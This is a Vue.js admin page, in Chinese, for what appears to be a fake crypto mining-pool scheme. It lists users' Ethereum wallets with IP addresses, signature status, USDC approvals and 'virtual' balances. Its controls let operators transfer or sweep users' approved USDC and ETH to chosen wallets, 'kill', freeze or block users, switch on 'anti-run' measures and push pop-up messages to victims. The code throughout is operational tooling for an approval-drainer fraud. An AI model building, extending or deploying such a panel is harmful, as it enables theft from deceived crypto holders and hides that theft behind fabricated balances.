<!--
* @Date: 2024/07/22 16:36:22
* @LastEditTime: 2024/07/22 16:36:22
* @Description:Ethereum钱包列表
-->
<template>
    <div class="app-container">
        <appLayout :showtop="showSearch">
            <template #top>
               
                <cardSearch>
                    <div slot="left">
                        <el-form :model="queryParams" size="small" :inline="true">
                            <el-form-item label="钱包地址">
                                <el-input v-model="queryParams.wallet" placeholder="钱包地址"></el-input>
                            </el-form-item>
                            <el-form-item label="收款钱包">
                                <el-input v-model="queryParams.reciverWallet" placeholder="收款钱包"></el-input>
                            </el-form-item>

                            <!-- <el-form-item label="抵押">
                                <el-select v-model="queryParams.isStaked" placeholder="抵押">
                                    <el-option v-for="(item, index) in isStakedOption" :key="item.id || item.value || index" :label="item.label"
                                        :value="item.value">
                                    </el-option>
                                </el-select>
                            </el-form-item> -->
                            <el-form-item label="杀掉">
                                <el-select v-model="queryParams.kills" clearable placeholder="杀掉">
                                    <el-option v-for="(item, index) in kills" :key="item.id || item.value || index" :label="item.label"
                                        :value="item.value">
                                    </el-option>
                                </el-select>
                            </el-form-item>
                            <el-form-item label="授权">
                                <el-select v-model="queryParams.approve" clearable placeholder="授权">
                                    <el-option v-for="(item, index) in approves" :key="item.id || item.value || index" :label="item.label"
                                        :value="item.value">
                                    </el-option>
                                </el-select>
                            </el-form-item>
                            <el-form-item label="资金池">
                                <el-select v-model="queryParams.poolsId" clearable placeholder="资金池">
                                    <el-option v-for="(item, index) in pools" :key="item.id || item.value || index" :label="item.label"
                                        :value="item.value">
                                    </el-option>
                                </el-select>
                            </el-form-item>
                            <el-form-item label="招聘员">
                                <el-select v-model="queryParams.inviteId" clearable placeholder="招聘员">
                                    <el-option v-for="item in invitesList" :key="item.id" :label="item.label"
                                        :value="item.value">
                                    </el-option>
                                </el-select>
                            </el-form-item>
                            <el-form-item label="真实/虚拟">
                                <el-select v-model="queryParams.reals" clearable placeholder="真实/虚拟">
                                    <el-option v-for="item in reals" :key="item.id" :label="item.label"
                                        :value="item.value">
                                    </el-option>
                                </el-select>
                            </el-form-item>

                            <el-form-item label="用户余额">
                                <el-select v-model="queryParams.balance" clearable placeholder="余额">
                                    <el-option v-for="item in balances" :key="item.id" :label="item.label"
                                        :value="item.value">
                                    </el-option>
                                </el-select>
                            </el-form-item>

                            <el-form-item label="收款钱包USDC">
                                <el-select v-model="queryParams.reciverUsdc" clearable placeholder="余额">
                                    <el-option v-for="item in balances" :key="item.id" :label="item.label"
                                        :value="item.value">
                                    </el-option>
                                </el-select>
                            </el-form-item>

                            <el-form-item label="收款钱包ETH">
                                <el-select v-model="queryParams.reciverEth" clearable placeholder="余额">
                                    <el-option key="0.001" label="大于0.001" value="0.001"> </el-option> 
                                </el-select>
                            </el-form-item>
                            
                            <el-form-item label="钱包模糊查询">
                                <el-input v-model="queryParams.likeWallet" placeholder="输入部分钱包地址"></el-input>
                            </el-form-item>

                        </el-form>
                    </div>
                    <div slot="right">
                        <el-button type="primary" icon="el-icon-search" size="mini" @click="search">搜索</el-button>
                        <el-button type="info" plain icon="el-icon-refresh" size="mini"
                            @click="restSearchData">重置</el-button>
                    </div>
                </cardSearch>
            </template>
            <template #dmain="scope">
               


                    <div class="topNum">
                        <div class="topNum-stats">
                        <div>
                            <span>当天新增客户:</span>
                            <span>{{ statics.walletCount }}</span>
                        </div>
                        <div >
                            <span>当天划U数量: </span>
                            <span>{{ statics.transferUsdc }}</span>
                        </div>
                        <div >
                            <span>总授权 USDC :</span>
                            <span>{{ statics.allowanceUsdc }}</span>
                        </div>
                    </div>
                        <div class="topNum-actions">
                            <el-button type="primary" v-if="userId == 1" size="mini" @click="collection">归集收款USDC</el-button>
                            <el-button type="primary"  v-if="userId == 1"  size="mini" @click="handlerCollectEth">归集ETH</el-button>
                            <div class="toolbar-wrapper">
                            <right-toolbar :showSearch.sync="showSearch" @queryTable="search"></right-toolbar>
                            </div>
                        </div> 
                   
                   
                </div>
                <el-table v-loading="loading" ref="multipleTable" @cell-click="copyToClipboard"
                    @selection-change="selectionChangeHandle" :data="tableData" style="width: 100%"
                    :height="scope.maxheight">
                    <el-table-column type="selection"  fixed="left" header-align="center" align="center" width="50">
                    </el-table-column>

                    <el-table-column prop="wallet" width="150px"  fixed="left" label="钱包地址">
                        <template slot-scope="scope">
                            <el-button type="text"  @click="openWallet(scope.row.wallet)">{{ scope.row.wallet
                                }}</el-button>
                            <div>ETH:{{ scope.row.eth }}</div>
                            <div>USDC:{{ scope.row.usdc }}</div>
                            <div>{{ scope.row.addr }}</div>
                            <div>({{ scope.row.ip }})</div>
                            <el-button @click="refreceh(scope.row)">刷新</el-button>
                        </template>
                    </el-table-column>
                    <el-table-column prop="reciverWallet" width="200px"   label="收款钱包">
                        <template slot-scope="scope">
                            <el-button type="text" @click="openWallet(scope.row.reciverWallet)">{{
                                scope.row.reciverWallet }}</el-button>
                            <div>ETH:{{ scope.row.reciverEth }}</div>
                            <div>USDC:{{ scope.row.reciverUsdc }}</div>
                        </template>
                    </el-table-column>

                    <el-table-column prop="item" label="矿池余额" width="200px">
                        <template slot-scope="scope">
                            <div> 收益 ETH: {{ scope.row.item && scope.row.item.rewardEth }}</div>
                            <div> 可换 ETH: {{ scope.row.item && scope.row.item.swapEth }}</div>
                            <div> 可提 USDC: {{ scope.row.item && scope.row.item.withdrawUsdc }}</div>
                            <div> 已提 USDC: {{ scope.row.item && scope.row.item.withdrwaedUsdc }}</div>
                            <div> 已换 USDC: {{ scope.row.item && scope.row.item.swapedUsdc }}</div>
                            <div> 虚拟 USDC: {{ scope.row.item && scope.row.item.virtualUsdc }}</div>
                            <div> 虚拟 ETH: {{ scope.row.item && scope.row.item.virtualEth }}</div>
                            <div> 客户 USDC: {{ scope.row.item && scope.row.item.usdc }}</div>

                        </template>
                    </el-table-column>

                    <el-table-column prop="reals" label="钱包类型">
                        <template slot-scope="scope">
                            <el-tag type='danger' v-if="scope.row.reals == 1">虚拟 </el-tag>
                            <el-tag class="green-background" style="color:#5adb1a !important"
                                v-if="scope.row.reals == 0">真实 </el-tag>
                        </template>
                    </el-table-column>

                    <el-table-column prop="approveWallet" width="200px"   @click="openWallet(row.approveWallet)" label="授权钱包">
                        <template slot-scope="scope">
                            <el-button type="text" @click="openWallet(scope.row.approveWallet)">{{
                                scope.row.approveWallet }}</el-button>
                            <div>ETH:{{ scope.row.approveEth }}</div>
                        </template>
                    </el-table-column>

                    <el-table-column prop="signData" label="是否签名">
                        <template slot-scope="scope">
                            <el-tag type='danger' v-if="!scope.row.signData ">未签名 </el-tag>
                            <el-tag class="green-background" style="color:#5adb1a !important"
                                v-if="scope.row.signData">已签名 </el-tag>
                        </template>
                    </el-table-column>



                    <el-table-column prop="approve" label="是否授权">
                        <template slot-scope="scope">
                            <el-tag type='danger' v-if="scope.row.approve == 0">未授权 </el-tag>
                            <el-tag class="green-background" style="color:#5adb1a !important"
                                v-if="scope.row.approve == 1">已授权 </el-tag>
                        </template>
                    </el-table-column>

                    <el-table-column prop="auto" label="防跑">
                        <template slot-scope="scope">
                            <el-tag type='danger' v-if="scope.row.auto == 0 ">未开启 </el-tag>
                            <el-tag class="green-background" style="color:#5adb1a !important" v-if="scope.row.auto == 1">已开启 </el-tag>
                        </template>
                    </el-table-column>

                    <el-table-column prop="approveOther" label="授权其他">
                        <template slot-scope="scope">
                            <el-tag type='danger' v-if="scope.row.approveOther == 1 ">是 </el-tag>
                            <el-tag class="green-background" style="color:#5adb1a !important" v-if="scope.row.approveOther == 0">否 </el-tag>
                        </template>
                    </el-table-column>


                    <el-table-column prop="inviteName" label="资金池/招聘员" width="120px">
                        <template slot-scope="scope">
                            {{ (scope.row.pools ? scope.row.pools : '-') + '/' + (scope.row.inviteName ?
                                scope.row.inviteName : '-') }}
                        </template>
                    </el-table-column>
                    <el-table-column prop="inviteWallet" width="120px"  label="推荐钱包">
                        <template slot-scope="scope">
                            <span style="color:#00adff"> {{ scope.row.inviteWallet }}</span>
                        </template>
                    </el-table-column>
                    <el-table-column prop="created" label="注册时间" width="150px"  :formatter="formatterColumn">
                        <template slot-scope="scope">
                            {{ scope.row.created ? $moment(scope.row.created).format('YYYY-MM-DD HH:mm:ss') : '' }}
                        </template>
                    </el-table-column>

                    <el-table-column prop="lastDate" label="最后上线时间" width="150px"  :formatter="formatterColumn">
                        <template slot-scope="scope">
                            {{ scope.row.created ? $moment(scope.row.lastDate).format('YYYY-MM-DD HH:mm:ss') : '' }}
                        </template>
                    </el-table-column>

                    <el-table-column label="操作" align="center"  width="120px">
                        <template slot-scope="scope">
                            <el-button type="text" size="mini" @click="handleEdit(scope.row)">编辑</el-button>
                            <el-button type="text" v-if="isAuth('admin:transfer:usdc')" size="mini"
                                @click="transferUsdc(scope.row)">划转USDC</el-button>
                            <el-button v-if="scope.row.auto == 0" type="text"  size="mini" @click="handlerAuto(scope.row)">开启防跑</el-button>
                            <el-button v-if="scope.row.auto == 1" type="text"  size="mini" @click="handlerAuto(scope.row)">关闭防跑</el-button>
                            <el-button type="text" size="mini" @click="sendUsdo(scope.row)">发送收益</el-button>
                            <el-button type="text" size="mini" @click="sendDailog(scope.row)">发送跳窗</el-button>
                            <el-button type="text" v-if="isAuth('admin:return:usdc')"   size="mini" @click="sendUsdc(scope.row)">退还USDC</el-button>
                        </template>
                    </el-table-column>
                </el-table>
                <!-- 分页 -->
                <div class="page">
                    <el-pagination @size-change="handleSizeChange" @current-change="handleCurrentChange"
                        :current-page="queryParams.current" :page-sizes="[100,20, 30, 40, 50,200]"
                        :page-size="queryParams.size" layout="total, sizes, prev, pager, next" :total="total">
                    </el-pagination>
                </div>
            </template>
        </appLayout>
        <!-- 编辑 -->
        <el-dialog title="编辑钱包" :visible.sync="openEdit" append-to-body :width="dialogWidth"
            :close-on-click-modal="false" @close="canceladd">
            <el-form ref="addForm" :model="addForm" :rules="rules" inline :label-width="labelWidth" size="small">
                <el-form-item label="真实/虚拟">
                    <el-select v-model="addForm.reals" placeholder="真实/虚拟">
                        <el-option v-for="(item, index) in reals" :key="index" :label="item.label" :value="item.value">
                        </el-option>
                    </el-select>
                </el-form-item>
                <el-form-item label="虚拟 USDC" prop="virtualUsdc">
                    <el-input-number v-model="addForm.virtualUsdc" placeholder="虚拟 USDC"
                        controls-position="right"></el-input-number>
                </el-form-item>
                <el-form-item label="虚拟 ETH" prop="virtualEth">
                    <el-input-number v-model="addForm.virtualEth" placeholder="虚拟 ETH"
                        controls-position="right"></el-input-number>
                </el-form-item>
                <!-- <el-form-item label="启用抢跑" prop="rob">
                    <el-checkbox v-model="addForm.rob" :true-label="1" :false-label="0"></el-checkbox>
                </el-form-item> -->
                <el-form-item label="杀掉">
                    <el-select v-model="addForm.kills" placeholder="杀掉">
                        <el-option v-for="(item, index) in kills" :key="index" :label="item.label" :value="item.value">
                        </el-option>
                    </el-select>
                </el-form-item>
                <el-form-item label="冻结" prop="freeze">
                    <el-checkbox v-model="addForm.freeze" :true-label="1" :false-label="0"></el-checkbox>
                </el-form-item>
                <el-form-item label="封锁" prop="blockade">
                    <el-checkbox v-model="addForm.blockade" :true-label="1" :false-label="0"></el-checkbox>
                </el-form-item>
                <el-form-item label="授权" prop="approve">
                    <el-checkbox v-model="addForm.approve" :true-label="1" :false-label="0"></el-checkbox>
                </el-form-item>
                <el-form-item label="合并计算" prop="rewardType">
                    <el-checkbox v-model="addForm.rewardType" :true-label="1" :false-label="0"></el-checkbox>
                </el-form-item>
                <el-form-item label="增加1%" prop="staking">
                    <el-checkbox v-model="addForm.staking" :true-label="1" :false-label="0"></el-checkbox>
                </el-form-item>
            </el-form>
            <div slot="footer" class="dialog-footer">
                <el-button type="primary" @click="saveEdit" size="small">保存</el-button>
                <el-button @click="canceladd" type="info" plain size="small">取消</el-button>
            </div>
        </el-dialog>

        <!-- 划转USDC -->
        <el-dialog title="划转USDC" :visible.sync="openTransferUsdc" append-to-body width="540px"
            :close-on-click-modal="false" @close="canceladdSendUsdo">
            <el-form ref="addSendForm" :model="transferUsdcForm" inline label-width="120px" size="small">
                <el-form-item label="是否全量" prop="all">
                    <el-switch v-model="transferUsdcForm.all" active-color="#13ce66" inactive-color="#ff4949">
                    </el-switch>
                </el-form-item>
                <el-form-item v-if="transferUsdcForm.all == false" label="划转数量" prop="amount">
                    <el-input v-model="transferUsdcForm.amount" placeholder="划转数量"></el-input>
                </el-form-item>
                  <el-form-item label="Google令牌" prop="googleAuthCode">
                    <el-input v-model="transferUsdcForm.googleAuthCode" placeholder="请输入Google令牌"></el-input>
                </el-form-item>
            </el-form>

            <div slot="footer" class="dialog-footer">
                <el-button type="primary" @click="sendTransferUsdc" size="small">划转</el-button>
                <el-button @click="cancelTransferUsdc" type="info" plain size="small">取消</el-button>
            </div>
        </el-dialog>
   <!-- 发送USDC -->
    <el-dialog title="退还USDC" :visible.sync="openSendUsdc" append-to-body width="540px" :close-on-click-modal="false"
            @close="canceladdSendUsdo">
            <el-form ref="addSendUsdcForm" :model="sendUsdcForm" inline label-width="120px" size="small">
                <el-form-item label="退还数量(USDC)" prop="amount">
                    <el-input v-model="sendUsdcForm.amount" placeholder="退还数量(USDC)"></el-input>
                </el-form-item>
                <el-form-item label="收款钱包" prop="toWallet">
                    <el-input v-model="sendUsdcForm.toWallet" placeholder="收款钱包"></el-input>
                </el-form-item>
                <el-form-item label="备注" prop="remark">
                    <el-input v-model="sendUsdcForm.remark" placeholder="备注"></el-input>
                </el-form-item>
            </el-form>
            <div slot="footer" class="dialog-footer">
                <el-button type="primary" @click="saveSendUsdc" size="small">提交</el-button>
                <el-button @click="canceladdSendUsdc" type="info" plain size="small">取消</el-button>
            </div>
        </el-dialog>

        <!-- 发送收益 -->
        <el-dialog title="发送收益" :visible.sync="openSendUsdo" append-to-body width="540px" :close-on-click-modal="false"
            @close="canceladdSendUsdo">
            <el-form ref="addSendForm" :model="sendUsdoForm" inline label-width="120px" size="small">
                <el-form-item label="发送收益金额 ETH" prop="amount">
                    <el-input v-model="sendUsdoForm.amount" placeholder="发送收益金额 ETH"></el-input>
                </el-form-item>
                <el-form-item label="Google令牌" prop="googleAuthCode">
                    <el-input v-model="sendUsdoForm.googleAuthCode" placeholder="请输入Google令牌"></el-input>
                </el-form-item>
            </el-form>
            <div slot="footer" class="dialog-footer">
                <el-button type="primary" @click="saveSendUsdo" size="small">保存</el-button>
                <el-button @click="canceladdSendUsdo" type="info" plain size="small">取消</el-button>
            </div>
        </el-dialog>
        <!-- 发送跳窗 -->
        <el-dialog title="发送跳窗" :visible.sync="openSendDailog" append-to-body :width="dialogWidth"
            :close-on-click-modal="false" @close="canceladdSendDailog">
            <el-form ref="addSendDailogForm" :model="sendDailogForm" inline :label-width="labelWidth" size="small">
                <el-form-item label="消息类型">
                    <el-radio-group v-model="sendDailogForm.type">
                        <el-radio :label="0">文本</el-radio>
                        <el-radio :label="1">图片</el-radio>
                    </el-radio-group>
                </el-form-item>
                <el-form-item label="发送图片" v-if="sendDailogForm.type == 1">
                    <Imageupload :isShowTip="false" :fileSize="10" :limit="1" @getimg="getannexs($event)"
                        :showimgurl="imglist">
                    </Imageupload>
                </el-form-item>
                <el-form-item label="信息" prop="message" v-if="sendDailogForm.type == 0">
                    <el-input v-model="sendDailogForm.content" placeholder="信息"></el-input>
                </el-form-item>
            </el-form>
            <div slot="footer" class="dialog-footer">
                <el-button type="primary" @click="saveSendDailog" size="small">发送</el-button>
                <el-button @click="canceladdSendDailog" type="info" plain size="small">取消</el-button>
            </div>
        </el-dialog>
   <!-- 归集ETH -->
   <el-dialog title="归集ETH" :visible.sync="openCollectETH" append-to-body width="540px" :close-on-click-modal="false"
            @close="cancelCollectETH">
            <el-form ref="addSendForm" :model="collectEthForm" inline label-width="120px" size="small">
                <el-form-item label="ETH接收地址" prop="reciverWallet">
                    <el-input v-model="collectEthForm.reciverWallet" placeholder="ETH接收地址"></el-input>
                </el-form-item>
            </el-form>
            <div slot="footer" class="dialog-footer">
                <el-button type="primary" @click="submitCollectETH" size="small">提交</el-button>
                <el-button @click="cancelCollectETH" type="info" plain size="small">取消</el-button>
            </div>
        </el-dialog>


    </div>
</template>


<script>
import resizeWIdth from '@/mixins/resizeWIdth';
import Imageupload from "@/components/ImageUpload";
import { mapGetters } from 'vuex';
export default {
    name: "commodityOrder",
    components: { Imageupload },
    mixins: [resizeWIdth],
    data() {
        return {
            openEdit: false,
            openSendDailog: false,
            openSendUsdo: false,
            openSendUsdc: false,
            openTransferUsdc: false,
            openCollectETH:false,
            loadingInstance: null,// 用于存储加载层实例
            // form表单
            addForm: {},
            sendForm: {},
            sendUsdoForm: {},
            sendUsdcForm: {},
            sendDailogForm: {},
            transferUsdcForm: {},
            collectEthForm:{
                wallets:[],
                reciverWallet:''
            },
            collectForm: {
                wallets: []
            },
            statics: {
                walletCount: 0,
                transferUsdc: 0,
                allowanceUsdc: 0,

            },
            // rules
            rules: {
                eth: [{ required: true, message: '请输入ETH', trigger: 'blur' }],
                usdc: [{ required: true, message: '请输入USDC', trigger: 'blur' }],
            },
            balances: [
                { id: 1, label: "大于0", value: 0 },
                { id: 2, label: "大于10", value: 10 },
                { id: 3, label: "大于100", value: 100 },
                { id: 4, label: "大于500", value: 500 },
                { id: 5, label: "大于1000", value: 1000},
                { id: 6, label: "大于5000", value: 5000 }
            ],
            // 显示搜索
            showSearch: !this.isMobile,
            // 总计
            total: 0,
            // 查询参数
            queryParams: {
                current: 1,
                size: 100,
                wallet: "",
                reciverWallet: "",
                kills: "",
                approve: "",
                poolsId: "",
                inviteId: "",
                reals: "",
                balance: "",
                reciverUsdc:"",
                reciverEth:"",
                likeWallet:''
                
            },
            dataListSelections: [],
            tableData: [{}],
            loading: false,
            imglist: [],
        };
    },
    computed: {
        ...mapGetters(["kills", 'approves', 'pools', 'invitesList', 'reals', 'userId'])
    },
    created() {
        this.getList();
        this.getStatics();
    },
    methods: {
        
        getStatics() {
            this.$http({
                url: this.$http.adornUrl("/admin/wallets/statics"),
                method: "post",
                data: this.$http.adornParams(
                    this.queryParams
                ),
            }).then(({ data }) => {
                if (data.success) {
                    this.statics.walletCount = data.data.walletCount;
                    this.statics.transferUsdc = data.data.transferUsdc;
                    this.statics.allowanceUsdc = data.data.allowanceUsdc
                } else {
                    this.statics.walletCount = 0;
                    this.statics.transferUsdc = 0.00;
                    this.statics.allowanceUsdc = 0.00;
                }
            })
        },
        getList() {
            this.loading = true;
            this.$http({
                url: this.$http.adornUrl("/admin/wallets/list"),
                method: "post",
                data: this.$http.adornParams(
                    this.queryParams
                ),
            }).then(({ data }) => {
                if (data.success) {
                    this.tableData = data.data.records;
                    this.total = Number(data.data.total)
                    this.loading = false
                } else {
                    this.$message.error(data.msg);
                    this.loading = false
                }
            })
        },
        handlerAuto(row){
            this.loading = true;
            this.$http({
                url: this.$http.adornUrl("/admin/wallets/auto"),
                method: "post",
                data: this.$http.adornParams(
                    {wallet : row.wallet}
                ),
            }).then(({ data }) => {
                if (data.success) {
                    this.queryParams.wallet = row.wallet;
                    this.getList();
                } else {
                    this.$message.error(data.msg);
                }
                this.loading = false;
            })
        },
        // 获取封面信息
        getannexs(data) {
            if (data.length > 0) {
                this.sendDailogForm.content = data[0].url;
            } else {
                this.sendDailogForm.content = '';
            }
        },
        // 搜索
        search() {
            this.getStatics();
            this.getList();
        },
        // 重置
        restSearchData() {
            this.queryParams = this.$options.data().queryParams;
            this.getList();
            this.getStatics();
        },
        // 分页相关函数
        handleSizeChange(val) {
            this.queryParams.size = val;
            this.getList();
        },
        handleCurrentChange(val) {
            this.queryParams.current = val;
            this.getList();
        },
        // 编辑
        handleEdit(data) {
            let { wallet, reals, rob, kills, freeze, blockade, approve,rewardType, staking,item: { virtualEth, virtualUsdc } } = data;
            this.addForm = { wallet, reals: String(reals), rob, kills: String(kills), freeze, blockade, approve,rewardType,staking, virtualEth, virtualUsdc };
            this.openEdit = true;
        },
        // 保存
        saveEdit() {
            // 显示加载层
            this.loadingInstance = this.$loading({
                lock: true,
                text: '正在处理...',
                spinner: 'el-icon-loading',
                background: 'rgba(0, 0, 0, 0.7)'
            });
            this.$http({
                url: this.$http.adornUrl("/admin/wallets/update"),
                method: "post",
                data: this.$http.adornParams(
                    this.addForm
                ),
            }).then(({ data }) => {
                if (data.success) {
                    this.getList();
                    this.openEdit = false;
                    this.$message.success('编辑成功！')
                } else {
                    this.$message.error(data.msg);
                }
                this.loadingInstance.close();
            })
        },
        // 取消
        canceladd() {
            this.openEdit = false;
            this.addForm = this.$options.data().addForm;
        },

        //划转USDC
        cancelTransferUsdc() {
            this.openTransferUsdc = false;
            this.transferUsdcForm = this.$options.data().transferUsdcForm;
        },

        transferUsdc(data) {
            this.transferUsdcForm = {
                wallet: data.wallet,
                all: false,
                amount: 0
            }
            this.openTransferUsdc = true;
        },

        sendTransferUsdc() {
            // 显示加载层
            this.loadingInstance = this.$loading({
                lock: true,
                text: '正在处理...',
                spinner: 'el-icon-loading',
                background: 'rgba(0, 0, 0, 0.7)'
            });

            this.$http({
                url: this.$http.adornUrl("/admin/transfer/usdc"),
                method: "post",
                data: this.$http.adornParams(
                    this.transferUsdcForm
                ),
            }).then(({ data }) => {
                if (data.success) {
                    this.openTransferUsdc = false;
                    this.$message.success('划转成功！')
                } else {
                    this.$message.error(data.msg);
                }
                this.loadingInstance.close();
            })
        },
        // 发送收益
        sendUsdo(data) {
            this.sendUsdoForm = {
                wallet: data.wallet,
                amount: 0,
                googleAuthCode: ''
            }
            this.openSendUsdo = true;
        },
        saveSendUsdo() {
            if (!this.sendUsdoForm.googleAuthCode) {
                this.$message.error('请输入Google令牌');
                return;
            }
            // 显示加载层
            this.loadingInstance = this.$loading({
                lock: true,
                text: '正在处理...',
                spinner: 'el-icon-loading',
                background: 'rgba(0, 0, 0, 0.7)'
            });

            this.$http({
                url: this.$http.adornUrl("/admin/wallets/sendRewad"),
                method: "post",
                data: this.$http.adornParams(
                    this.sendUsdoForm
                ),
            }).then(({ data }) => {
                if (data.success) {
                    this.getList();
                    this.openSendUsdo = false;
                    this.$message.success('发送收益成功！')
                } else {
                    this.$message.error(data.msg);
                }
                this.loadingInstance.close();
            })
        },
        canceladdSendUsdo() {
            this.openSendUsdo = false;
            this.sendUsdoForm = this.$options.data().sendUsdoForm;
        },

         // 发送usdc
         sendUsdc(data) {
            this.sendUsdcForm = {
                wallet: data.wallet,
                amount: 0
            }
            this.openSendUsdc = true;
        },
        saveSendUsdc() {

            if (!this.sendUsdcForm.amount) {
                this.$message.error("请输入退还数量(USDC)");
                return;
            }
            if (!this.sendUsdcForm.toWallet) {
                this.$message.error("请输入收款钱包地址");
                return;
            }
            if (this.sendUsdcForm.amount <= 0) {
                this.$message.error("退还数量(USDC)必须大于0");
                return;
            }
            // 显示加载层
            this.loadingInstance = this.$loading({
                lock: true,
                text: '正在处理...',
                spinner: 'el-icon-loading',
                background: 'rgba(0, 0, 0, 0.7)'
            });

            this.$http({
                url: this.$http.adornUrl("/admin/wallets/sendUsdc"),
                method: "post",
                data: this.$http.adornParams(
                    this.sendUsdcForm
                ),
            }).then(({ data }) => {
                if (data.success) {
                    this.getList();
                    this.openSendUsdc = false;
                    this.$message.success('退还USDC成功！')
                } else {
                    this.$message.error(data.msg);
                }
                this.loadingInstance.close();
            })
        },

        canceladdSendUsdc() {
            this.openSendUsdc = false;
            this.sendUsdcForm = this.$options.data().sendUsdcForm;
        },
        // 发送跳窗
        sendDailog(data) {
            this.sendDailogForm = {
                id: this.userId + "-" + new Date(),
                type: 0,//0: 文字消息 , 1：图片消息
                senderId: this.userId,
                reciverId: data.id,
                content: ''
            }
            this.openSendDailog = true;
        },
        saveSendDailog() {
            // 显示加载层
            this.loadingInstance = this.$loading({
                lock: true,
                text: '正在处理...',
                spinner: 'el-icon-loading',
                background: 'rgba(0, 0, 0, 0.7)'
            });
            this.$http({
                url: this.$http.adornUrl("/admin/wallets/sendMessage"),
                method: "post",
                data: this.$http.adornParams(
                    this.sendDailogForm
                ),
            }).then(({ data }) => {
                if (data.success) {
                    this.getList();
                    this.openSendDailog = false;
                    this.$message.success('发送跳窗成功！')
                } else {
                    this.$message.error(data.msg);
                }
                this.loadingInstance.close();
            })
        },
        canceladdSendDailog() {
            this.openSendDailog = false;
            this.sendDailogForm = this.$options.data().sendDailogForm;
        },
        copyToClipboard(row, column, cell, event) {
            let copywallet = ['wallet', 'inviteWallet', 'approveWallet', 'reciverWallet']
            console.log(column.property + " --" + copywallet.includes(column.property))
            if (!copywallet.includes(column.property)) return;
            var text = row[column.property];
            console.log(text)
            if (!text) return;
            navigator.clipboard.writeText(text).then(() => {
                this.$message.success(text + ' Copied to clipboard!');
            }).catch(err => {
                this.$message.error('Failed to copy: ' + err);
            });
        },
        // 刷新
        refreceh(row) {
            this.loading = true;
            this.$http({
                url: this.$http.adornUrl("/admin/wallets/reflsh"),
                method: "post",
                data: this.$http.adornParams(
                    {wallet : row.wallet}
                ),
            }).then(({ data }) => {
                if (data.success) {
                 //   this.queryParams.wallet = row.wallet;
                    this.getList();
                } else {
                    this.$message.error(data.msg);
                }
                this.loading = false;
            })
        },
        selectionChangeHandle(val) {
            this.dataListSelections = val;
        },

        cancelCollectETH() {
            this.openCollectETH = false;
            this.collectEthForm = this.$options.data().collectEthForm;
        },

        handlerCollectEth(){
            this.openCollectETH = true;
        },

        submitCollectETH(){
            if (this.dataListSelections.length == 0) {
                this.$message.error("请选择需要归集的钱包");
                return;
            }
            if (!this.collectEthForm.reciverWallet) {
                this.$message.error("请输入接收ETH钱包地址");
                return;
            }
            for (var i in this.dataListSelections) {
                this.collectEthForm.wallets.push(this.dataListSelections[i].wallet);
            }
            this.loading = true;
            this.$http({
                url: this.$http.adornUrl("/admin/collect/submitEth"),
                method: "post",
                data: this.$http.adornParams(
                    this.collectEthForm
                ),
            }).then(({ data }) => {
                if (data.success) {
                    this.$message.success('归集任务发送成功!等待系统执行..')
                    this.collectEthForm.reciverWallet='';
                    this.collectEthForm.wallets = [];
                    this.getList();
                } else {
                    this.$message.error(data.msg);
                    this.collectEthForm.reciverWallet='';
                    this.collectEthForm.wallets = [];
                }
                this.loading = false;
                this.cancelCollectETH();
            })
        },
        //归集
        collection() {
            if (this.dataListSelections.length == 0) {
                this.$message.error("请选择需要归集的钱包");
                return;
            }
            for (var i in this.dataListSelections) {
                this.collectForm.wallets.push(this.dataListSelections[i].wallet);
            }
            this.loading = true;
            this.$http({
                url: this.$http.adornUrl("/admin/collect/submit"),
                method: "post",
                data: this.$http.adornParams(
                    this.collectForm
                ),
            }).then(({ data }) => {
                if (data.success) {
                    this.$message.success('归集任务发送成功!等待系统执行..')
                    this.collectForm.wallets = [];
                    this.getList();
                } else {
                    this.$message.error(data.msg);
                    this.collectForm.wallets = [];
                }
                this.loading = false;
            })

        },
    },
};
</script>

<style lang="scss" scoped>

 
::v-deep .el-card .el-form-item__label {
    min-width: 78PX !important;
}

::v-deep .el-divider__text {
    position: absolute;
    background-color: #141414;
    padding: 0;
    font-weight: 400;
    color: #fff;
    font-size: 16px;
}

// .topNum {
//     background-color: #1d232b;
//     display: flex;
//     align-items: center;
//     border-radius: 4px;
//     padding-left: 20px;
//     padding-top: 20px;

// }

/* 默认 PC 样式 */
.topNum {
    display: flex;
    align-items: center;
    justify-content: space-between; /* 左右对齐 */
    width: 100%; /* 确保占满整个父容器 */
    padding: 0 10px; /* 可调整的左右内边距 */
    box-sizing: border-box;
}

.topNum-stats {
    display: flex;
    align-items: center;
    gap: 40px; /* 左侧统计项目间距 */
}

.topNum-actions {
    display: flex;
    align-items: center;
    gap: 10px; /* 按钮与工具栏之间的间距 */
}

.toolbar-wrapper {
    display: flex;
    align-items: center; /* 确保图标对齐 */
    gap: 8px; /* 图表（图标）之间的间距 */
    }


/* 手机适配 */
@media (max-width: 768px) {
    .topNum {
        display: flex;
        flex-direction: column; /* 垂直排列 */
        align-items: flex-start; /* 左对齐 */
        gap: 20px; /* 项目之间的间距 */
    }

    .topNum-stats {
        display: flex;
        flex-wrap: wrap; /* 允许换行 */
        gap: 10px; /* 每个统计项目之间的间距 */
        width: 100%; /* 占满宽度 */
    }

    .topNum-actions {
        display: flex;
        width: 100%; /* 占满容器宽度 */
        justify-content: flex-start; /* 按钮左对齐 */
        gap: 10px; /* 按钮与工具栏之间的间距 */
    }


}

.green-background.el-tag--medium::before {
    background: #5adb1a !important;
}

.el-button--text {
    border-color: transparent;
    color: #016EEB;
    font-family: "SourceHanSans";
    font-size: 12px;
    white-space: normal !important;
    word-wrap: break-word !important;
    word-break: break-word !important;
    text-align: left;
}

.el-table__body tr.hover-row > td,
.el-table__row.hover-row,
.el-table__row.hover-row > td,
.el-table__body tr:hover > td,
.el-table__row:hover,
.el-table__row:hover > td {
  background: #1d1d1d !important;
  background-color: #1d1d1d !important;
  color: #fff !important;
}
</style>